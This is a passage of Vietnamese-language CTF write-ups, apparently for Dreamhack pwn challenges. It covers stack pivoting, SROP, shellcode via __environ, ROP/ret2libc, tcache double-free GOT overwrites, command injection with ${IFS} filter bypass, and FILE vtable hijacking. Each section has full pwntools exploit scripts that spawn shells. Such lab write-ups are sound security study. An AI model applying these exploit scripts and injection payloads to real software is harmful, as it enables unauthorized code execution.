p.sendlineafter(b'value: ',str(libc.address+0x4527a))
#one gadget : 0x4527a , 0xf03a4 , 0xf1247

p.interactive()
```


---------------------

12 . MSNW 
------

bài này liên quan tới one-of-bytes ( tuy nhiên ở đây là two-of-bytes )

- reverse : bài này có 2 hàm chính Meong và Nyang . đầu tiên ctrinh sẽ gọi Meong trước
- có 1 lỗi tràn 2 bytes ở read → có thể hàm gì đó với địa chỉ ( thường là sẽ pivot stack ) . nó so sánh kí tự đầu có phải là q không . nếu không phải thì return 1 và ngược lại thì exit ctrinh
- function Nyang sẽ in cái mà ta nhập ở Meong

![image](https://hackmd.io/_uploads/HyixsBj7kg.png)


![image](https://hackmd.io/_uploads/S1fWiSoQJg.png)

![image](https://hackmd.io/_uploads/rknWsrsQkx.png)

![image](https://hackmd.io/_uploads/By7MjSsQye.png)

- vì ta thấy hàm win trong binary → ret2win , vậy muốn ret2win thì làm như thế nào ?

ta không thể thay đổi được ret address . Tuy nhiên ta có thể thay đổi save rbp của nó , và ta cũng có thể điều khiển được chương trình 

- đầu tiên muốn làm dc điều đó thì ta cần leak vì địa chỉ stack là luôn động . thấy printf sẽ in đến khi gặp null bytes . nên ta có thể cho read nhập vào và sang hàm Nyang sẽ leak được địa chỉ cho ta
- lấy được rbp rồi thì mọi chuyện trở nên dễ dàng . ta sẽ lấy địa chỉ leak được canh chừng làm sao thay đổi để địa chỉ trỏ đúng hàm win mà ta đã nhập trong stack

script 

```
#!/usr/bin/python3
from pwn import *
context.binary = exe = ELF('./msnw',checksec=False)
p = process()
p = remote('host3.dreamhack.games', 23530)
#p.recvline()
payload = b'a'*1
payload = payload.ljust(304,b'a')
p.sendafter(b': ',payload)
p.recvuntil(b'a'*304)
leak = u64(p.recv(6).ljust(8,b'\x00'))
need = leak - 784
print("leak: ",hex(leak))
#gdb.attach(p)
input()
p.send(p64(exe.sym.Win)*38 + p64(need))

#leak = p.recvline()
#print(leak)
p.interactive()
```

----------

13 . SigReturn-Oriented Programming
------

có BOF , thiếu gadget → xài ROP

![image](https://hackmd.io/_uploads/rJEvoSsQ1l.png)

script : 

giải thích 1 chút về script , srop sẽ thiết lập các thanh ghi như ý muốn của ta → execve 

- rax = 0x3b ( sys reg ) , rdx rsi = 0 , rdi trỏ đến chứa địa chỉ trỏ đến /bin/sh  , rip sẽ là syscall
- đầu tiên ta overflow , thực hiện read /bin/sh vào rw address . tiếp theo đó là thực hiện execve(/bin/sh)


```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./srop',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 10128)
pop_rdi = 0x0000000000400583
pop_rsi_r15 = 0x0000000000400581
pop_rax_sys = 0x00000000004004eb
syscall = next(exe.search(asm("syscall")))
bss = exe.bss()
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdx = 0
frame.rsi = 0
frame.rip = 0x00000000004004ec
frame.rdi = 0x601a40
payload = b'a'*24
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(0x601a40) + p64(0)
payload += p64(exe.sym.read)
payload += p64(pop_rax_sys) + p64(15)
payload += bytes(frame)
p.send(payload)
sleep(3)
p.send(b'/bin/sh\x00')
p.interactive()
```

------------


14 . send_sig
-------

tương tự bài SigReturn-Oriented Programming , thiết lập các thanh ghi bằng SROP 

source : 
```
void FUN_004010b6(void)

{
  undefined local_10 [8];
  
  write(1,"Signal:",7);
  read(0,local_10,0x400);
  return;
}


void entry(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  write(1,"++++++++++++++++++Welcome to dreamhack++++++++++++++++++\n",0x39);
  write(1,"+ You can send a signal to dreamhack server.           +\n",0x39);
  write(1,"++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n",0x39);
  FUN_004010b6();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
script 


```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./send_sig',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 10507)
syscall = 0x00000000004010b0
pop_rax = 0x00000000004010ae
bin_sh = 0x402000
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdx = 0
frame.rdi = bin_sh
frame.rsi =0
frame.rip = syscall
payload = b'a'*16
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(0x00000000004010b0)
payload += bytes(frame)
p.send(payload)
p.interactiv
```


-----------

15 . environ
-----

checksec : 

![image](https://hackmd.io/_uploads/HyGZhHiQ1x.png)

NX tắt → có thể dùng shellcode , tuy nhiên CANARY lại bật và được leak libc , có libc tuy nhiên bai này không có BOF . hmmmmmmmmmmm

- có jmp đến địa chỉ nào đó → vẫn có thể thực thi shellcode kh cần bof , tuy nhiên phải leak dc địa chỉ stack

![image](https://hackmd.io/_uploads/HJbf3romJg.png)


cứu tinh ở đây sẽ là  environment variable , ta thấy nó trỏ đến địa chỉ stack 

![image](https://hackmd.io/_uploads/BkJ73HjmJg.png)

- oke vào việc :

bước 1 : leak libc tìm libc base và đia chỉ libc __environ

bước 2 : tính toán offset từ buf đến địa chỉ stack mà ta biết từ libc __environ

bước 3 : ghi shellcode vào địa chỉ đó và jmp đến địa chỉ đó

![image](https://hackmd.io/_uploads/HJZV3rjmyx.png)

offset = 280 

sau khi hoàn chỉnh các bước trên , địa chỉ trỏ đến shellcode và thực thi nó 


![image](https://hackmd.io/_uploads/SyNHhroX1e.png)


script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./environ_patched')
libc = ELF('./libc.so.6')
p = process(exe.path)
#p = remote('host3.dreamhack.games', 15553)
p.recvuntil(b': ')
leak = int(p.recvline().strip(),16)
shellcode = asm(shellcraft.sh())
print(len(shellcode))
print("leak: ",hex(leak))
#gdb.attach(p)
libc.address = leak -3954208
print("libc: ",hex(libc.address))
print("env: ",hex(libc.sym.__environ))
p.sendlineafter(b'Size: ',str(330))
input()
p.sendafter(b'Data: ',b'\x90'*280 + shellcode)
p.sendlineafter("=",str(libc.sym.__environ))
#gdb.attach(p)

p.interactive()
```

-----------


16 . validator
-------

source : 

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-80h]

  memset(&s, 0, 0x10uLL);
  read(0, &s, 0x400uLL);
  validate(&s, 128LL);
  return 0;
}
```

validate : 


```
__int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]
  signed int j; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( *(_BYTE *)((signed int)i + a1) != correct[i] )	// corret = "DREAMHACK!"
      exit(0);
  }
  for ( j = 11; a2 > j; ++j )
  {
    if ( *(unsigned __int8 *)(j + a1) != *(char *)(j + 1LL + a1) + 1 )
      exit(0);
  }
  return 0LL;
}
```

vòng for đầu sẽ check với chuỗi "dreamhack"

vòng for thứ 2 sẽ check kí tự j với (j+1) +1 có nghĩa là nếu j=128 là kí tự a thì index 129 phải là kí tự b , nếu khác thì exit , ta có thể nhập bất kì giá trị nào miễn thõa mãn là được 


![image](https://hackmd.io/_uploads/B13IRSj7Je.png)

- có nghĩa là phiên bản kernel trước đó thì vùng bss sẽ có thể execute được -> có thể truyền shellcode vào bss và thực thi

- để bypass vòng for thứ hai thì chỉ cần gửi vào các byte từ lớn đến bé 

- ở đây ta sẽ ghi vào got luôn cũng dc , mình sẽ chọn memset để ghi và return vào memset để thực thi shellcode

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./validator_dist')
#p = process()
p = remote('host3.dreamhack.games', 12773)
input()
pop_rdi = 0x00000000004006f3
pop_rdx = 0x000000000040057b
pop_rsi_r15 = 0x00000000004006f1
exit_ = exe.got.exit
shellcode_1 = asm('''
                mov rbx , 29400045130965551
                push rbx
                mov rdi,rsp
                xor rsi,rsi
                xor rdx,rdx
                mov rax,0x3b
                syscall
                ''',arch='amd64')
payload = b'DREAMHACK!'
payload += b'0'
for i in range(128-11,-1,-1):
    payload += bytes([i])
payload += b'a'*7
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rdx) + p64(0x200)
payload += p64(pop_rsi_r15) + p64(exe.got.memset) + p64(0)
payload += p64(exe.plt.read)
payload += p64(exe.got.memset)
p.send(payload)
sleep(1)
p.send(shellcode_1)

p.interactive()
```

hoặc ghi vào bss

```
from pwn import *


#p = process('./validator_dist')
p = remote('host3.dreamhack.games',21959)
e = ELF('./validator_dist')

pay = b'DREAMHACK!'

for i in range(130-len(pay),1,-1):
        pay += i.to_bytes(1,byteorder='little')

shellcode = asm(shellcraft.amd64.sh(),arch='amd64')

pay += b'\x90'*7 #for sfp

bss = 0x60104b
rdiret = 0x4006f3
rsir15ret = 0x4006f1
rdxret = 0x40057b
rbpret = 0x40057e

#insert shellcode to bss
#read(0,bss,0x500)
pay += p64(rdiret) + p64(0)
pay += p64(rsir15ret) + p64(bss) + p64(0)
pay += p64(rdxret) + p64(0x500)
pay += p64(e.plt['read'])

#return to bss
pay += p64(bss)

p.send(pay)

#send read() data
pay2 = b'\x90'*0x100 + shellcode

p.send(pay2)

p.interactive()
```

----------------------

17 . tcache dup
------


- vì code của bài khá ngắn nên ta đi thẳng vào 2 option chính luôn


option 1 :  check xem số lượng có lớn hơn 10 không , cho nhập 1 size tùy thích và malloc 1 chunk với size vừa nhập , tiếp theo là đọc dữ liệu vào chunk đó 
![image](https://hackmd.io/_uploads/BJz-mdSw41g.png)


option2 : 

cho nhập 1 idx và free() con trỏ + với idx đó luôn 

![image](https://hackmd.io/_uploads/HyiQ_SvNye.png)







- ý tưởng : vì bài này PIE tắt và được cho hàm get_shell luôn nên ý tưởng là sẽ overwrite get_shell bằng cái gì đó 

- ta thấy có lỗi uaf và double free luôn nhma chưa tận dụng dc thằng uaf , mình sẽ làm theo hướng double_free

- bài này được cho file libc.2.27 và không check double free , nên ý tưởng là như sau :

malloc() -> free() -> free() -> malloc()  này là để ghi got vào fw -> malloc() này dùng để lấy thằng đầu ra -> thằng đầu lúc này sẽ là địa chỉ got nên ta sẽ ghi đè nó bằng get_shell()


- lưu ý là size này phải nằm trong tcache :v: 

script 
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
gdb.attach(p,gdbscript='''
            b*0x00000000004009ba
            b*0x00000000004009c7
            b*0x0000000000400a1f
            b*0x0000000000400a71
            b*0x0000000000400a95

           ''')

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',b'aaaa')

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'idx: ',b'0')
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'idx: ',b'0')

input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',p64(exe.got.read))

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',b'aaaaa')

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',p64(exe.sym.get_shell))

p.interactive()
```

-------------

18 . tcache_dup2
----------------------

phân tích
bài này cũng giống bài tcache_dup , tuy nhiên có 1 số điểm khác =))

có 3 option cần phân tích : create, delete , modify
modify:
nó bắt ta nhập idx vào , check xem nếu lớn hơn 6 thì exit , tiếp theo là size , và dữ liệu cần chỉnh sửa
```
unsigned __int64 modify_heap()
{
  size_t size; // [rsp+8h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%ld", &v2);                   // nhập idx cần chỉnh sửa
  if ( v2 > 6 )
    exit(0);
  printf("Size: ");
  __isoc99_scanf("%ld", &size);                 // nhập size 
  if ( size > 0x10 )
    exit(0);
  printf("Data: ");
  read(0, *((void **)&ptr + v2), size);         // read dữ liệu vào 
  return __readfsqword(0x28u) ^ v3;
}
create :

đơn giản chỉ là nhập 1 size tùy thích , malloc với cái size đó , read dữ liệu vào

unsigned __int64 __fastcall create_heap(int a1)
{
  size_t size; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( a1 > 6 )                                 // nếu tạo 7 thì exit
    exit(0);
  printf("Size: ");
  __isoc99_scanf("%ld", &size);                 // nhập size tùy ý
  *((_QWORD *)&ptr + a1) = malloc(size);        // malloc với size tùy ý vừa nhập
  if ( !*((_QWORD *)&ptr + a1) )
    exit(0);
  printf("Data: ");
  read(0, *((void **)&ptr + a1), size - 1);     // read dữ liệu vào size-1
  return __readfsqword(0x28u) ^ v3;
}
```

delete :

nhập idx cần free , check idx , free idx đã nhập
```
unsigned __int64 delete_heap()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%ld", &v1);                   // nhập idx cần free
  if ( v1 > 6 )
    exit(0);
  if ( !*((_QWORD *)&ptr + v1) )
    exit(0);
  free(*((void **)&ptr + v1));                  // uaf , không xóa con trỏ
  return __readfsqword(0x28u) ^ v2;
}
```
tóm tắt : option1 dùng để tạo chunk , option2 dùng để chỉnh sửa chunk , option3 dùng delete

vậy ta cũng sẽ sử dụng bug double free() y chang bài trước , tuy nhiên ở đây ta cần nói đến có lẽ là phiên bản libc này khác với bài trước

nếu ta thử làm giống thì ý tưởng sẽ là : tạo 1 chunk -> free vào tcache -> chỉnh sửa chunk đó để bypass check double_free -> delete tiếp -> malloc và thay đổi fw của chunk -> malloc tiếp để lấy chunk đầu trong bin ra -> malloc tiếp ghi dữ liệu để get_shell vào

tuy nhiên ý tưởng ở trên sẽ không thành công vì bài này ta sẽ phải cần chú ý đến cái gọi là tc_idx . tc_idx được hiểu rằng nó sẽ đếm số chunk trong bin . nếu đếm = 0 nghĩa là không có chunk nào trong tcache nên nó sẽ kh làm gì với tcache_bin
https://dreamhack.io/forum/qna/1305

vì vậy nếu như ý tưởng ở đầu ta muốn làm thì tc_idx của ta chỉ có 2 (gồm 2 thằng được free) vì vậy ta phải free() thêm lần nữa hoặc tạo 1 chunk khác rồi free()

script :
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup2_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe
p = process()
gdb.attach(p,gdbscript='''
           b*create_heap+82
           b*create_heap+94
           b*create_heap+222
           b*delete_heap+63
           b*delete_heap+152
           ''')
def create_heap(size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data)
def delete_heap(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'idx: ',str(idx))
def modify_heap(idx,size,data):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'idx: ',str(idx))
    p.sendlineafter(b'Size: ',str(size))
    p.sendafter(b'Data: ',data)
input()
create_heap(50,b'aaaa')
delete_heap(0)

modify_heap(0,9,b'a'*9)
delete_heap(0)

#modify_heap(0,9,b'a'*9)
#delete_heap(0)


create_heap(50,p64(0x404058))
create_heap(50,b'a')
create_heap(50,p64(exe.sym.get_shell))

p.interactive()
```
tham khảo :
```
from pwn import *

p = remote("host3.dreamhack.games", 21320)
#p = process("./tcache_dup2")
e = ELF("./tcache_dup2")

def create(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(str(size))
    p.recvuntil(b"Data: ")
    p.send(data)

def mod(idx, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"idx: ")
    p.sendline(str(idx))
    p.recvuntil(b"Size: ")
    p.sendline(str(size))
    p.recvuntil(b"Data: ")
    p.send(data)

def delete(idx):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"idx: ")
    p.sendline(str(idx))

create(0x30, b"A")
create(0x30, b"A")
delete(0)
delete(1)

mod(1, 0x10, p64(e.got['puts']))

create(0x30, b"B")
create(0x30, p64(e.sym['get_shell']))


p.interactive()
```
https://ogu123.tistory.com/186

https://thfist-1071.tistory.com/category/Security/%EC%8B%9C%EC%8A%A4%ED%85%9C%20%ED%95%B4%ED%82%B9%28PWN%2C%20%20System%29?page=2


-------------------------


19 . Dream's Notepad
--------------------------

1 bài về lệnh shell nhưng khá khó hiểu nên mình sẽ làm theo RTL 


```

//gcc -o Notepad Notepad.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void Initalize(){
   setvbuf(stdin, (char *)NULL, _IONBF, 0);
   setvbuf(stdout, (char *)NULL, _IONBF, 0);
   setvbuf(stderr, (char *)NULL, _IONBF, 0);
}

void main()
{
    Initalize();

    puts("Welcome to Dream's Notepad!\n");

    char title[10] = {0,};
    char content[64] = {0,};

    puts("-----Enter the content-----");
    read(0, content, sizeof(content) - 1);

    for (int i = 0; content[i] != 0; i++)
    {
        if (content[i] == '\n')
        {
            content[i] = 0;
            break;
        }
    }

    if(strstr(content, ".") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "/") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, ";") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "*") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "cat") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "echo") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "flag") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "sh") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "bin") != NULL) {
        puts("It can't be..");
        return;
    }

    char tmp[128] = {0,};

    sprintf(tmp, "echo %s > /home/Dnote/note", content);
    system(tmp);
    
    FILE* p = fopen("/home/Dnote/note", "r");
    unsigned int size = 0;
    if (p > 0)
    {
        fseek(p, 0, SEEK_END);
        size = ftell(p) + 1;
        fclose(p);
        remove("/home/Dnote/note");
    }

    char message[256];
    
    puts("\n-----Leave a message-----");
    read(0, message, size - 1);

    puts("\nBye Bye!!:-)");
}
```

có 2 lần nhập dc yêu cầu , lần nhập đầu tiên để thực thi các lệnh ở system(tmp) tuy nhiên mình kh biết cái này nên sẽ làm theo cách 2 

- ta thấy nó mở 1 dg dẫn và set size = 0  , ở read sẽ xảy ra IOF → 0-1 = 1 số rất lớn (unsigned ) → có BOF và return to libc thôi

dùng one_gadget

script : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./Notepad_patched')
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
#p = process()
p = remote('host3.dreamhack.games', 22245)
pop_rdi =  0x0000000000400c73
p.sendafter(b'content-----\n',b'`')
payload = b'a'*488
payload += p64(pop_rdi)
payload += p64(exe.got.read)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)
#gdb.attach(p,gdbscript='''
        #   b*0x0000000000400c02
         #  b*0x0000000000400c0d
        #   ''')
#input()
p.sendafter(b'message-----\n',payload)
p.recvuntil(b'Bye Bye!!:-)\n')
leak = u64(p.recv(6).ljust(8,b'\x00'))
print("leak: ",hex(leak))
libc.address = leak - libc.sym.read

p.sendafter(b'content-----\n',b'`')
payload2 = b'a'*488
payload2 += p64(pop_rdi+1)
payload2 += p64(libc.address+0xf1247)
#payload2 += p64(pop_rdi)
#payload2 += p64(libc.address+1625687)
#payload2 += p64(libc.sym.system)
input()
p.sendafter(b'message-----\n',payload2)

p.interactive()
```

tham khảo 

![image](https://hackmd.io/_uploads/S1jFQIoQyl.png)

![image](https://hackmd.io/_uploads/rJWam8j7kx.png)

![image](https://hackmd.io/_uploads/rJBlNIiXkx.png)

------------


20 . cat jump
------


source : 


```
/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

void PrintBanner() {
    puts("                         .-.\n" \
         "                          \\ \\\n" \
         "                           \\ \\\n" \
         "                            | |\n" \
         "                            | |\n" \
         "          /\\---/\\   _,---._ | |\n" \
         "         /^   ^  \\,'       `. ;\n" \
         "        ( O   O   )           ;\n" \
         "         `.=o=__,'            \\\n" \
         "           /         _,--.__   \\\n" \
         "          /  _ )   ,'   `-. `-. \\\n" \
         "         / ,' /  ,'        \\ \\ \\ \\\n" \
         "        / /  / ,'          (,_)(,_)\n" \
         "       (,;  (,,)      jrei\n");
}

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);

    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}

int main(void) {
    Init();
    PrintBanner();
    StartGame();

    return 0;
}

```

đầu tiên obstacle dc gán ngẫu nhiên
nó kêu ta nhảy ( h ,l ) , nếu capnip != 0 thì giảm catnip -1 và tăng jump lên 1 ( goal là 37 )

- nếu input là h hoặc l mà obstacle ( giá trị ngẫu nhiên ) khác với 0 và 1 thì nhảy thành công
- nếu không thì bị mắc kẹt
- khởi tạo biến p = (double)rand() / RAND_MAX
nếu p < 0.1 -> catnip = 3 và quay về kêu nhập tiếp =)))

**Đối với phần lệnh injeciton, hãy thay thế chuỗi nhập echo để có thể đọc được cờ. Sự cố Tệp nhị phân không cho phép khoảng trắng trong phần đó, vì vậy `${IFS}`hãy cố gắng tránh nó bằng cách sử dụng `${IFS}`

```
from pwn import *
from ctypes import CDLL
from ctypes.util import find_library

p = process("./cat_jump")
#p = remote("host3.dreamhack.games", 22210)

libc = CDLL(find_library('c'))
libc.srand(libc.time(0x0))

for i in range(37):
    obstacle = libc.rand() % 2
    print("i : "+str(i)+", obstacle : "+str(obstacle))
    if obstacle==0:
        p.sendlineafter("jump='j': ", "l")
    else:
        p.sendlineafter("jump='j': ", "h")
    print(p.recvline())
    libc.rand() # for catnip

p.sendlineafter(b':',b'$(cat${IFS}flag)')

p.interactive()
```

hoặc cũng có thể như này : 

```cmd = b'aaa";sh;"a'```


----------------

21 . iofile_vtable
------------



source đề cho :  
- đầu tiên ta thấy được hàm get_shell , có lẽ là target của bài
- ctrinh cho nhập 8 bytes vào name -> không có BOF
- tiếp theo có 4 option :  
  + option 1 in chuỗi GOOD 
  + option2 thì dùng fprintf 
  + option3 fgetc
  + option4 read 8 bytes vào stderr + 1

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char name[8];
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    int idx = 0;
    int sel;

    initialize();

    printf("what is your name: ");
    read(0, name, 8);
    while(1) {
        printf("1. print\n");
        printf("2. error\n");
        printf("3. read\n");
        printf("4. chance\n");
        printf("> ");

        scanf("%d", &sel);
        switch(sel) {
            case 1:
                printf("GOOD\n");
                break;
            case 2:
                fprintf(stderr, "ERROR\n");
                break;
            case 3:
                fgetc(stdin);
                break;
            case 4:
                printf("change: ");
                read(0, stderr + 1, 8);
                break;
            default:
                break;
            }
    }
    return 0;
}

```


debug in gdb:
lần read đầu tiên read vào 1 địa chỉ bss 



- ta thấy nghi ngờ option4 nên sẽ thử debug xem địa chỉ đó là gì , ta thấy địa chỉ này sẽ trỏ đến vtable ( đó là địa chỉ trỏ tới _IO_file_jumps)



- option3 có hàm fgetc : sau khi hỏi chat gpt thì vẫn chưa thấy gì bất thường
- vậy ở đây ta sẽ ghi đè dc vtable bằng 1 địa chỉ nào đó có thể thực thi và lấy shell -> nghĩ ngay đến option 1 nhập 8 bytes và có luôn hàm win

- mặc dù code C là fprintf nhưng trong ctrinh lại là fwrite thì cach thức của hàm fprintf sẽ là sử dụng __xsputn , sau đó buf sẽ ghi vào bằng cách dùng fwrite
- ta sẽ kiểm tra _IO_file_jumps
```
gef➤  p _IO_file_jumps
$4 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7c8c070 <_IO_new_file_finish>,
  __overflow = 0x7ffff7c8ce40 <_IO_new_file_overflow>,
  __underflow = 0x7ffff7c8cb30 <_IO_new_file_underflow>,
  __uflow = 0x7ffff7c8dde0 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7c8f300 <__GI__IO_default_pbackfail>,
  __xsputn = 0x7ffff7c8b680 <_IO_new_file_xsputn>,
  __xsgetn = 0x7ffff7c8b330 <__GI__IO_file_xsgetn>,
  __seekoff = 0x7ffff7c8a960 <_IO_new_file_seekoff>,
  __seekpos = 0x7ffff7c8e530 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7c8a620 <_IO_new_file_setbuf>,
  __sync = 0x7ffff7c8a4b0 <_IO_new_file_sync>,
  __doallocate = 0x7ffff7c7eb90 <__GI__IO_file_doallocate>,
  __read = 0x7ffff7c8b9b0 <__GI__IO_file_read>,
  __write = 0x7ffff7c8af40 <_IO_new_file_write>,
  __seek = 0x7ffff7c8a6f0 <__GI__IO_file_seek>,
  __close = 0x7ffff7c8a610 <__GI__IO_file_close>,
  __stat = 0x7ffff7c8af30 <__GI__IO_file_stat>,
  __showmanyc = 0x7ffff7c8f4a0 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7c8f4b0 <_IO_default_imbue>
}
gef➤  x/xg 0x00007ffff7e16600
0x7ffff7e16600 <_IO_file_jumps>:	0x0000000000000000
gef➤  x/10xg 0x00007ffff7e16600
0x7ffff7e16600 <_IO_file_jumps>:	0x0000000000000000	0x0000000000000000
0x7ffff7e16610 <_IO_file_jumps+16>:	0x00007ffff7c8c070	0x00007ffff7c8ce40
0x7ffff7e16620 <_IO_file_jumps+32>:	0x00007ffff7c8cb30	0x00007ffff7c8dde0
0x7ffff7e16630 <_IO_file_jumps+48>:	0x00007ffff7c8f300	0x00007ffff7c8b680
0x7ffff7e16640 <_IO_file_jumps+64>:	0x00007ffff7c8b330	0x00007ffff7c8a960
gef➤  
0x7ffff7e16650 <_IO_file_jumps+80>:	0x00007ffff7c8e530	0x00007ffff7c8a620
0x7ffff7e16660 <_IO_file_jumps+96>:	0x00007ffff7c8a4b0	0x00007ffff7c7eb90
0x7ffff7e16670 <_IO_file_jumps+112>:	0x00007ffff7c8b9b0	0x00007ffff7c8af40
0x7ffff7e16680 <_IO_file_jumps+128>:	0x00007ffff7c8a6f0	0x00007ffff7c8a610
0x7ffff7e16690 <_IO_file_jumps+144>:	0x00007ffff7c8af30	0x00007ffff7c8f4a0
```
```
gef➤  x/xg 0x00007ffff7c8b680
0x7ffff7c8b680 <_IO_new_file_xsputn>:	0x56415741fa1e0ff3
```

offset từ xsputn đến IO_file_jump là 56 

-> ý tưởng của ta là sẽ ghi address của get_shell - 56 vào biến name , chọn option 4 xong nhập địa chỉ của name vào , khi chọn option2 thì fprintf sẽ gọi đến IO_file_jump+56  mà lúc này nó đã bị ghi đè thành get_shell - 56 -> get_shell dc gọi

script :   

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./iofile_vtable')
p = process()

p.sendafter(b'name: ',p64(exe.sym.get_shell -56))
p.sendlineafter(b'> ',b'4')
p.sendlineafter(b'change: ',p64(0x00000000006010d0))
p.sendlineafter(b'> ',b'2')
p.interactive()
```


nếu chạy ở local nó sẽ check vtable -> không thành công , trên sever thì libc < 2.23 nên oke

![image](https://hackmd.io/_uploads/SyjEFUjmyx.png)



--------------

22 . uaf-overwrite
------

- vì heap là phần mình mới được học nên mình sẽ viết writeup thật kĩ để hiểu sâu 


phân tích


- chương trình sẽ có 3 option tương đương 3 function cần nói đến

- human_func

